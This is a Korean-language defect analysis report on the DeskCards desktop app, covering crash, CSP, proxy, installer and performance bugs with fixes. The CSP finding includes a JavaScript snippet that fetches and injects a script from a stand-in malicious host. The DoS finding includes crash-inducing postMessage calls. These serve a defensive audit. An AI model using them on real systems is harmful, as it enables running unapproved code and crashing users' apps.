# DeskCards 코드 리뷰 및 정밀 결함 분석 보고서

본 문서는 DeskCards 코드베이스(`v:\desktop\deskfolders`)를 대상으로 정적 소스 분석, 타입 시스템 검증, 런타임 논리 흐름 추적을 거쳐 작성된 결함 분석 보고서입니다.  
모든 결함에 대해 **실제 발생 시나리오(Trigger Scenario)**와 **코드 수준의 오류 발생 메커니즘(Mechanism)**, 그리고 **실제 영향 및 권장 조치 방안**을 상세히 기재하였습니다.

---

## 1. 결함 요약 (Summary Matrix)

| 구분 | 심각도 | 항목 | 영향 및 위험도 | 파일 위치 |
|:---:|:---:|---|---|---|
| **01** | **High** | `DardView.OnMessage` 타입 캐스팅 미처리로 인한 프로세스 크래시 | 악의적 웹 메시지 한 줄로 앱 전체 강제 종료 (DoS) | `src/DeskCards/DardView.cs:324, 331` |
| **02** | **High** | CSP `'unsafe-inline'` 허용으로 인한 원격 임의 코드 실행 | 승인되지 않은 외부 JS 동적 주입 및 실행 (보안 검증 무력화) | `src/DeskCards/DardView.cs:185` |
| **03** | **High** | `DardProxy` 임의 포트 허용 및 유휴 연결 무한 누수 | SSH/SMTP 등 일반 TCP 터널 악용, 소켓 및 Task 영구 누수 | `src/DeskCards/DardProxy.cs:55-81, 116` |
| **04** | **Medium** | `GroupManager.DeleteGroup` 부분 이동 후 중단 결함 | 이동 실패 시 롤백 없이 파일 파편화 및 상태 불일치 | `src/DeskCards/GroupManager.cs:662` |
| **05** | **Medium** | `FileOps.Unique`의 점(dot) 파일 선두 공백 생성 버그 | `.gitignore` 등 중복 시 ` (2).gitignore` 공백 파일 생성 | `src/DeskCards/FileOps.cs:183-186` |
| **06** | **Medium** | 업데이트 시 `version.txt` 및 보조 파일 미동기화 | 앱 업데이트 후에도 설치 디렉터리에 과거 버전 정보 영구 잔존 | `installer/.../SetupEngine.cs:60`<br>`src/DeskCards/Updater.cs:118` |
| **07** | **Medium** | 앱 제거(Uninstall) 시 `version.txt` 미삭제로 설치 폴더 잔존 | 정상 제거 후에도 빈 설치 폴더와 잔여 파일 영구 방치 | `installer/.../SetupEngine.cs:135-140` |
| **08** | **Medium** | `App.WaitForUpdatedFrom` PID 재활용 시 15초 기동 지연 | 구버전 PID가 다른 프로세스에 할당될 경우 15초 UI 블로킹 | `src/DeskCards/App.xaml.cs:123` |
| **09** | **Low** | `GroupModel.Reload` 시 UI 스레드 동기 Shell I/O 프리징 | 오프라인 네트워크 드라이브 바로가기 존재 시 UI 먹통 | `src/DeskCards/ShellIcons.cs:55` |
| **10** | **Low** | `EdgeBar` 40ms 무한 폴링으로 인한 CPU 유휴 상태 방해 | 상시 초당 25회 디스패처 기상, 노트북 배터리 절전 방해 | `src/DeskCards/EdgeBar.cs:42` |
| **11** | **Low** | 주요 비동기 진입점들의 `async void` 사용 | 예외 발생 시 비정상 종료 직행 위험 | `src/DeskCards/GroupManager.Dards.cs:230` 등 |
| **12** | **Low** | 탐색기 재시작 시 N개 카드의 중복 `Reconcile` 호출 | Progman 복구 시 불필요한 연속 디렉터리 스캔 | `src/DeskCards/GroupManager.cs:541` |

---

## 2. [High] 보안 및 안정성 치명 결함

### 01. `DardView.OnMessage` 타입 캐스팅 미처리로 인한 프로세스 크래시 (DoS)
- **코드 위치**: `src/DeskCards/DardView.cs:324, 331`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - 사용자가 설치한 `.dard` 카드의 내부 스크립트(또는 카드가 임포트한 서드파티 라이브러리나 악성 스크립트)가 규격과 다른 형태의 인자를 담은 WebMessage를 전송할 때 발생합니다.
  - 예시 1: `cards.post` 호출 시 객체 대신 숫자나 문자열을 전달:
    ```javascript
    window.chrome.webview.postMessage({ t: "call", id: 1, fn: "cards.post", args: 12345 });
    ```
  - 예시 2: `openUrl` 호출 시 문자열 대신 객체를 전달:
    ```javascript
    window.chrome.webview.postMessage({ t: "call", id: 2, fn: "openUrl", args: { target: "https://example.com" } });
    ```
- **내부 발생 메커니즘 (Mechanism)**:
  1. `DardView.OnMessage`는 수신된 JSON 문자열을 `JsonNode.Parse`하여 `Handle(fn, args)`로 넘깁니다.
  2. `case "cards.post":`에서 `args?["to"]`를 호출합니다. .NET의 `System.Text.Json.Nodes.JsonNode` 구현상, 해당 노드가 `JsonObject`가 아닌 `JsonValue`(숫자, 문자열 등)일 경우 인덱서 호출 시 **`System.InvalidOperationException: The node must be of type 'JsonObject'`**가 발생합니다.
  3. `case "openUrl":`에서 `args?.GetValue<string>()`를 호출합니다. 해당 노드가 `JsonValue`가 아닌 `JsonObject`일 경우 **`System.InvalidOperationException: The node must be of type 'JsonValue'`**가 발생합니다.
  4. `DardView.OnMessage`의 예외 포획 구문은 다음과 같이 `DardCallException`만을 잡도록 한정되어 있습니다:
     ```csharp
     try { Reply(id, Handle(fn, args)); }
     catch (DardCallException ex) { ... }
     ```
  5. 따라서 `InvalidOperationException`은 전혀 잡히지 않고 WebView2의 이벤트 디스패처로 탈출하며, DeskCards에는 전역 `DispatcherUnhandledException` 핸들러가 없으므로 **바탕화면의 DeskCards 앱 프로세스 전체가 즉시 강제 종료(Crash)**됩니다.
- **실제 영향**:
  - 카드 내 자바스크립트의 사소한 파라미터 버그나 악의적인 호출 한 줄로 사용자의 바탕화면 카드 전체가 순식간에 꺼지는 서비스 거부(DoS) 취약점입니다.
- **권장 수정 방안**:
  - `Handle` 내에서 인자 타입을 사전에 안전하게 검증(`args is JsonObject obj`, `args is JsonValue val`)하거나, `OnMessage`의 `catch` 블록에서 `Exception` 전반(최소한 `InvalidOperationException`)을 잡아 클라이언트에 오류 응답(`ok: false, name: "TypeError"`)을 반환하도록 개선해야 합니다.

---

### 02. CSP `'unsafe-inline'` 허용으로 인한 원격 임의 스크립트 실행
- **코드 위치**: `src/DeskCards/DardView.cs:185-190`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - `internet` 권한을 가진 `.dard` 카드를 사용자가 처음에 SHA-256 해시를 검토하고 승인(Allow)하여 실행 중인 상황입니다.
  - 카드 제작자 또는 해킹된 배포 서버가 승인 검토를 통과한 패키지 내부에 악성 코드를 직접 넣지 않고, 런타임에 외부 서버에서 동적으로 스크립트를 내려받아 실행하려 할 때 발생합니다.
- **내부 발생 메커니즘 (Mechanism)**:
  1. `DardView`는 카드 HTML 로드 시 다음과 같은 CSP 응답 헤더를 설정합니다:
     ```csharp
     string csp = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'" + net + "; ...";
     ```
  2. 설계 문서(`project.md`, `docs/dard-design.html`)에는 *"스크립트는 언제나 페이지 안에 있는 것만(승인한 뒤에 코드가 바뀌지 않게)"*이라고 명시되어 있습니다.
  3. 그러나 W3C CSP 표준에서 `script-src 'unsafe-inline'`은 정적 인라인 태그뿐만 아니라 **DOM API를 통해 동적으로 생성·주입되는 `<script>` 요소의 실행도 전부 허용**합니다:
     ```javascript
     const s = document.createElement('script');
     s.textContent = await (await fetch('https://malicious.org/payload.js')).text();
     document.head.appendChild(s); // 'unsafe-inline'에 의해 차단 없이 즉시 실행됨!
     ```
  4. 오직 strict CSP(예: 스크립트 블록의 SHA-256 해시 목록 또는 논스(nonce)를 지정하고 `'unsafe-inline'`을 제외한 정책)에서만 동적 스크립트 주입이 원천 차단됩니다.
- **실제 영향**:
  - **"사용자가 처음에 승인한 패키지 내의 코드만 실행된다"는 DARD 플랫폼의 핵심 보안 모델이 완전히 우회**됩니다. 인터넷 권한이 승인된 카드는 사용자의 감시 없이 언제든지 외부에서 임의의 최신 악성 코드를 수신하여 실행할 수 있습니다.
- **권장 수정 방안**:
  - `card.html` 및 `settings.html`에 포함된 인라인 스크립트의 SHA-256 해시를 로드 시 계산하여 `script-src 'sha256-...'` 형태로 지정하고 `'unsafe-inline'`을 제거하거나, 랜덤 논스(nonce)를 주입하는 엄격한 CSP 정책을 적용해야 합니다.

---

### 03. `DardProxy` 임의 포트 허용 및 유휴 연결 무한 누수
- **코드 위치**: `src/DeskCards/DardProxy.cs:55-81, 116`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - **시나리오 A (임의 포트 악용)**: `internet` 권한 카드가 공인망에 위치한 25(SMTP), 22(SSH), 445(SMB), 6379(Redis) 등의 비웹 포트로 TCP 연결을 요청할 때.
  - **시나리오 B (소켓 누수)**: 카드가 외부 서버로 CONNECT 터널을 개설한 후, 양쪽 종단(클라이언트와 원격 서버)이 데이터를 교환하지 않고 유휴(Idle) 상태로 방치하거나 네트워크 불안정으로 연결이 끊어지지 않은 채 멈춰 있을 때.
- **내부 발생 메커니즘 (Mechanism)**:
  1. `DardProxy.TrySplit`의 포트 검사는 `port is < 1 or > 65535`만 거르므로, 공인 IP이기만 하면 25(스팸 메일 릴레이), 22(SSH 무차별 대입 터널) 등 어떤 포트로의 CONNECT 터널도 그대로 허용됩니다.
  2. 스트림 릴레이 단계(`RelayAsync`)에서 다음과 같이 양방향 복사를 수행합니다:
     ```csharp
     var a = clientStream.CopyToAsync(upstreamStream);
     var b = upstreamStream.CopyToAsync(clientStream);
     await Task.WhenAny(a, b);
     ```
  3. `CopyToAsync`에 초기 연결에 사용했던 타임아웃 토큰(`timeout.Token`)이나 유휴 CancellationToken이 일절 전달되지 않습니다.
  4. 따라서 양쪽 종단 중 어느 한쪽도 FIN 패킷을 보내 연결을 닫지 않으면, 두 개의 `CopyToAsync` Task와 열린 소켓 핸들이 **앱이 종료될 때까지 영구히 메모리에 남아 누수**됩니다.
  5. 추가로 `Task.WhenAny` 완료 후 스트림을 닫을 때 반대편 스트림 복사에서 발생하는 `ObjectDisposedException`이 비동기 환경에서 Unobserved Exception으로 방치될 수 있습니다.
- **실제 영향**:
  - DeskCards 프로세스가 외부 임의 포트 공격의 경유지(프록시 봇)로 악용될 수 있으며, 장시간 실행 시 네트워크 유휴 소켓과 스레드 풀 자원이 고갈되어 메모리 누수가 발생합니다.
- **권장 수정 방안**:
  - 프록시 허용 포트를 일반적인 웹 포트(80, 443 등)로 화이트리스트 제한하고, 양방향 릴레이에 유휴 타임아웃(Idle Timeout)을 적용하여 일정 시간 통신이 없으면 소켓을 능동적으로 정리해야 합니다.

---

## 3. [Medium] 데이터 무결성, 설정 및 갱신 결함

### 04. `GroupManager.DeleteGroup` 부분 이동 후 중단 결함
- **코드 위치**: `src/DeskCards/GroupManager.cs:662-674`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - 사용자가 카드 폴더를 삭제하려 할 때, 그룹 폴더 안에 여러 파일(예: 5개)이 들어 있고 그중 특정 파일(예: 3번째 파일 `work.docx`)을 사용자가 워드나 다른 프로그램에서 열어 두어 파일 시스템 독점 락(Exclusive Lock)이 걸려 있는 상황.
- **내부 발생 메커니즘 (Mechanism)**:
  1. `DeleteGroup`은 삭제 전 내부 파일들을 사용자의 바탕화면(`FileOps.UserDesktop`)으로 먼저 이동시킵니다:
     ```csharp
     foreach (var path in entries)
         if (!FileOps.MoveTo(path, FileOps.UserDesktop)) return false;
     Directory.Delete(g.Folder, recursive: false);
     ```
  2. 1번째, 2번째 파일은 성공적으로 바탕화면으로 이동됩니다.
  3. 3번째 잠긴 파일에서 `File.Move`가 `IOException`을 던지고, `FileOps.MoveTo`는 이를 잡아 대화 상자를 띄운 뒤 `false`를 반환합니다.
  4. `DeleteGroup`은 즉시 `return false`로 실행을 중단합니다.
  5. **이미 이동된 1, 2번째 파일에 대한 롤백(되돌리기) 로직이 전혀 없습니다.**
  6. 결과적으로 `Directory.Delete`는 호출되지 않아 그룹 폴더는 여전히 남아 있고, 1·2번 파일은 바탕화면으로 나가 버렸으며, 3·4·5번 파일은 그룹 폴더에 갇히게 됩니다.
- **실제 영향**:
  - 그룹을 삭제하려다 실패했을 뿐인데, 그룹에 있던 파일들의 절반은 바탕화면으로 흩어지고 절반은 폴더에 남아 파일 체계가 두 동강으로 파편화되는 데이터 일관성 훼손이 발생합니다.
- **권장 수정 방안**:
  - 이동 시작 전 모든 파일에 대해 잠금 및 쓰기 권한을 사전 검사(Dry-run)하거나, 도중 실패 시 이미 이동한 파일들을 원래 폴더로 복구하는 보상 트랜잭션(Rollback) 로직을 도입해야 합니다.

---

### 05. `FileOps.Unique`의 점(dot) 파일 선두 공백 생성 버그
- **코드 위치**: `src/DeskCards/FileOps.cs:183-186`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - 그룹 폴더 안에 이미 `.gitignore` 또는 `.env` 파일이 존재하는 상태에서, 외부에서 동일한 이름의 `.gitignore` 파일을 드래그 앤 드롭하거나 붙여넣어 이름 충돌이 발생할 때.
- **내부 발생 메커니즘 (Mechanism)**:
  1. `FileOps.Unique`는 파일명 충돌 시 확장자를 분리하여 `(2)` 접미사를 붙입니다:
     ```csharp
     string stem = Path.GetFileNameWithoutExtension(name), ext = Path.GetExtension(name);
     for (int i = 2; ; i++) {
         dest = Path.Combine(folder, $"{stem} ({i}){ext}");
     ```
  2. .NET의 `Path.GetFileNameWithoutExtension(".gitignore")`는 **빈 문자열(`""`)**을 반환합니다. (확장자가 없는 게 아니라 파일명 전체가 확장자로 취급됨: `ext = ".gitignore"`).
  3. 따라서 포맷 스트링 `${stem} ({i}){ext}`는 `"" + " (2)" + ".gitignore"`가 되어 **`" (2).gitignore"`(선두에 공백 1칸이 포함된 파일명)**을 생성합니다.
- **실제 영향**:
  - 윈도우 파일 시스템에서 파일명 맨 앞에 공백이 들어가면 탐색기에서 파일명이 비정상 표시되거나, 명령줄(PowerShell, CMD, Git)에서 공백 이스케이프 누락으로 경로 인식 오류를 초래합니다.
- **권장 수정 방안**:
  - `string.IsNullOrEmpty(stem)`인 경우 파일명 전체 뒤에 접미사를 붙이도록 분기 처리해야 합니다 (예: `.gitignore (2)`).

---

### 06. 업데이트 시 `version.txt` 및 보조 파일 미동기화
- **코드 위치**: `installer/DeskCards.Setup/SetupEngine.cs:60`, `src/DeskCards/Updater.cs:118`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - 앱 버전 `0.2.1`이 설치되어 있는 PC에서 인앱 자동 업데이트(또는 설치기 재실행)를 통해 최신 버전 `0.2.10`으로 업데이트를 완료했을 때.
- **내부 발생 메커니즘 (Mechanism)**:
  1. 최초 설치 시에는 `CopyDirectory(stage, _env.InstallDir)`를 통해 릴리스 아카이브 내의 `DeskCards.exe`와 `version.txt`가 모두 설치 디렉터리에 복사됩니다.
  2. 그러나 이후 업데이트 단계(`UpdatePackage.Apply` 및 `SetupEngine.cs:60`)에서는 **오직 `DeskCards.exe` 단 1개 파일만 덮어쓰기 복사**합니다.
  3. `UpdatePackage.Cleanup`은 업데이트가 끝나면 임시 스테이징 폴더(`update\0.2.10\`)를 통째로 삭제하므로, 새로 다운로드했던 `version.txt`는 버려집니다.
  4. 그 결과 설치 디렉터리의 실행 파일은 0.2.10이지만, 바로 옆의 `version.txt`는 여전히 `0.2.1`로 방치됩니다.
- **실제 영향**:
  - 설치 디렉터리의 버전 정보 불일치로 인해, 외부 스크립트, 관리 도구, 패키지 매니저(Scoop 등)가 설치 폴더의 `version.txt`를 읽을 경우 구버전이 설치되어 있다고 오판하게 됩니다. 추후 배포 패키지에 보조 DLL이나 리소스가 추가될 경우에도 업데이트에서 누락되는 구조적 결함입니다.
- **권장 수정 방안**:
  - 업데이트 적용 시 `DeskCards.exe`뿐만 아니라 스테이징 폴더의 `version.txt` 및 배포 아티팩트를 설치 디렉터리로 함께 동기화해야 합니다.

---

### 07. 앱 제거(Uninstall) 시 `version.txt` 미삭제로 설치 폴더 잔존 *(신규)*
- **코드 위치**: `installer/DeskCards.Setup/SetupEngine.cs:135-140`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - 사용자가 Windows 제어판 또는 설정의 '설치된 앱'에서 DeskCards를 정상적으로 제거(Uninstall)할 때.
- **내부 발생 메커니즘 (Mechanism)**:
  1. `SetupEngine.Uninstall`은 설치 폴더 내의 실행 파일들을 삭제합니다:
     ```csharp
     foreach (string name in new[] { "DeskCards.exe", "DeskCards.exe.old", "DeskFolders.exe", "uninstall.exe" })
         DeleteFile(Path.Combine(_env.InstallDir, name));
     ```
  2. 삭제 대상 목록에 `version.txt`가 빠져 있습니다.
  3. 이어서 설치 디렉터리가 비어 있는지 검사하여 삭제를 시도합니다:
     ```csharp
     if (Directory.Exists(_env.InstallDir) && Directory.GetFileSystemEntries(_env.InstallDir).Length == 0)
         Directory.Delete(_env.InstallDir);
     ```
  4. 그러나 `version.txt`가 여전히 남아 있으므로 `Directory.GetFileSystemEntries`의 길이는 1이 되어 폴더 삭제 조건이 무시됩니다.
- **실제 영향**:
  - 사용자가 앱을 완전히 삭제했음에도 불구하고, `%LOCALAPPDATA%\Programs\DeskCards` 폴더와 그 안의 `version.txt`가 지워지지 않고 사용자 PC에 영구히 찌꺼기 파일로 남게 됩니다.
- **권장 수정 방안**:
  - 파일 삭제 루프에 `version.txt`를 추가하거나, 설정 보존 여부에 따라 설치 디렉터리를 완전히 정리하도록 수정해야 합니다.

---

### 08. `App.WaitForUpdatedFrom` PID 재활용 시 15초 기동 지연
- **코드 위치**: `src/DeskCards/App.xaml.cs:123-125`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - DeskCards가 업데이트를 적용하고 새 프로세스를 실행할 때 `--updated-from <구버전PID>` 인자를 넘깁니다.
  - 구버전 프로세스가 종료된 직후, Windows OS 커널이 해당 PID를 백그라운드 시스템 서비스(svchost 등)나 사용자의 다른 장기 실행 프로세스에 즉시 재할당(Recycle)했을 때 발생합니다.
- **내부 발생 메커니즘 (Mechanism)**:
  1. `App.WaitForUpdatedFrom`은 전달받은 PID로 프로세스를 조회하고 종료를 기다립니다:
     ```csharp
     using var old = Process.GetProcessById(pid);
     old.WaitForExit(15000);
     ```
  2. 대상 프로세스가 실제로 `DeskCards`인지 확인하는 `old.ProcessName == "DeskCards"` 검사가 전혀 없습니다.
  3. 만약 해당 PID가 다른 살아있는 시스템 프로세스에 할당되었다면, 그 프로세스는 당연히 15초 안에 종료되지 않으므로 DeskCards 메인 UI 스레드는 **정확히 15,000ms(15초) 동안 아무 화면도 띄우지 못하고 멈춥니다(Hang).**
- **실제 영향**:
  - 업데이트 후 앱이 다시 켜질 때 15초 동안 마우스 커서가 멈추거나 앱이 반응하지 않아 사용자가 프로세스가 먹통이 되었다고 판단하여 강제 종료하게 만듭니다.
- **권장 수정 방안**:
  - `old.ProcessName.Equals("DeskCards", StringComparison.OrdinalIgnoreCase)` 검사를 추가하여, 이름이 일치하지 않으면 기다리지 않고 즉시 건너뛰도록 처리해야 합니다.

---

## 4. [Low] 성능 저하 및 운영 안정성

### 09. `GroupModel.Reload` 시 UI 스레드 동기 Shell I/O 프리징
- **코드 위치**: `src/DeskCards/ShellIcons.cs:55`, `src/DeskCards/GroupModel.cs:88`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - 그룹 폴더 안에 네트워크 드라이브(UNC 경로 `\\nas\share\...`)의 파일이나 바로가기(`.lnk`)가 들어 있는 상태에서, NAS 전원이 꺼져 있거나 오프라인 네트워크 환경일 때 앱을 시작하거나 그룹을 새로고침할 때.
- **내부 발생 메커니즘 (Mechanism)**:
  - `ShellIcons.Get()`은 Windows 셸 API인 `SHCreateItemFromParsingName`을 호출하여 아이콘을 가져옵니다.
  - 이 호출이 WPF UI 메인 스레드에서 동기적으로 일어납니다. 오프라인 네트워크 경로에 대해 Windows Shell API는 TCP SYN 타임아웃(기본 20~30초) 동안 블로킹됩니다.
- **실제 영향**:
  - 앱 기동 시 또는 폴더 감시 이벤트 발생 시 UI 스레드가 수십 초 동안 멈추며 바탕화면의 모든 카드가 '응답 없음' 상태가 됩니다.
- **권장 수정 방안**:
  - 셸 아이콘 추출 작업을 백그라운드 작업(`Task.Run`)으로 분리하고, UI에는 기본 폴더/파일 아이콘을 먼저 표시한 뒤 비동기로 교체해야 합니다.

---

### 10. `EdgeBar` 40ms 무한 폴링으로 인한 CPU 유휴 상태 방해
- **코드 위치**: `src/DeskCards/EdgeBar.cs:42-45`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - 노트북 배터리 전원으로 사용 중이며, 마우스를 전혀 움직이지 않고 유휴 상태로 데스크톱을 방치할 때.
- **내부 발생 메커니즘 (Mechanism)**:
  - `EdgeBar`는 40ms 간격의 `DispatcherTimer`를 상시 구동하며 1초에 25번씩 UI 스레드를 깨워 마우스 좌표(`GetCursorPos`)와 화면 경계를 계산합니다.
- **실제 영향**:
  - CPU 코어가 저전력 유휴 상태(Deep Sleep / C-State)로 완전히 내려가지 못하고 지속적으로 깨어나 노트북 배터리 수명을 갉아먹습니다.
- **권장 수정 방안**:
  - 마우스가 비활성 상태일 때는 타이머 주기를 늘리거나(200~300ms), 윈도우 마우스 훅 또는 화면 진입 감지 이벤트 방식으로 개선할 수 있습니다.

---

### 11. 주요 비동기 진입점들의 `async void` 사용
- **코드 위치**:
  - `src/DeskCards/GroupManager.Dards.cs:230` (`MoveDardStorage`)
  - `src/DeskCards/GroupManager.Dards.cs:433` (`DeleteDardStorage`)
  - `src/DeskCards/GroupManager.DardIssues.cs:108` (`MeasureDardUsage`)
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - 카드 저장소 이전 또는 용량 측정 비동기 작업 도중 디스크 꽉 참, 파일 잠금, 권한 부족 등의 I/O 예외가 발생할 때.
- **내부 발생 메커니즘 (Mechanism)**:
  - C#에서 `async void` 메서드는 반환할 `Task`가 없어 예외가 호출자로 전달되지 않고 `SynchronizationContext`를 통해 런타임의 최상위 미처리 예외로 직행합니다.
- **실제 영향**:
  - 백그라운드 정리나 용량 측정 도중 사소한 파일 I/O 오류가 하나만 발생해도 프로세스 전체가 비정상 강제 종료됩니다.
- **권장 수정 방안**:
  - 모든 비동기 메서드를 `async Task`로 전환하고, 호출부에서 적절한 예외 처리를 수행해야 합니다.

---

### 12. 탐색기 재시작 시 N개 카드의 중복 `Reconcile` 호출
- **코드 위치**: `src/DeskCards/GroupManager.cs:541-551`
- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
- **발생 상황 (Trigger Scenario)**:
  - Windows 탐색기(`explorer.exe`)가 비정상 종료 후 재시작되거나 사용자가 작업 관리자에서 탐색기를 재시작했을 때.
- **내부 발생 메커니즘 (Mechanism)**:
  - 바탕화면에 N개의 카드가 떠 있는 상태에서 부모 윈도우(`Progman`)가 파괴되면, N개 카드의 `OnCardClosed`가 동시에 실행되며 각각 1.5초 지연 타이머를 생성하여 등록합니다.
  - 카드가 중복 생성되지는 않으나, 1.5초 뒤 N번의 디스크 스캔 및 카드 동기화(`Reconcile`)가 연속으로 호출됩니다.
- **실제 영향**:
  - 탐색기 복구 시점에 불필요한 중복 디스크 I/O와 CPU 스파이크가 발생합니다.
- **권장 수정 방안**:
  - `GroupManager` 수준에서 단일 디바운스(Debounce) 타이머로 통합 관리해야 합니다.

---

## 5. 부록: 검증 결과 무해/오탐으로 판정된 항목

1. **`DeskCard`의 `HwndSource.RemoveHook` 누수 의심**:
   - **판정: 무해 (False Positive)**
   - WPF의 `Window.Close()`는 윈도우 파괴(`WM_NCDESTROY`) 시 `HwndSource.Dispose()`를 내부 호출하며, `HwndSource`가 자신의 훅 리스트를 스스로 초기화합니다. 따라서 메모리 누수가 발생하지 않습니다.
2. **`Config.Save` 백그라운드 동시성 충돌 의심**:
   - **판정: 무해 (False Positive)**
   - 비동기 콜백들이 전부 WPF UI 스레드로 마샬링되어 순차 실행되므로 다중 스레드 동시 쓰기 충돌은 발생하지 않습니다.
3. **`BalloonTip.Show` 및 `Path.GetTempFileName()` 고갈 의심**:
   - **판정: 극히 희박 (Inconsequential)**
   - 호출 빈도가 극히 낮고 임시 파일은 즉시 삭제되므로 65,536개 제한에 도달할 위험이 없습니다.
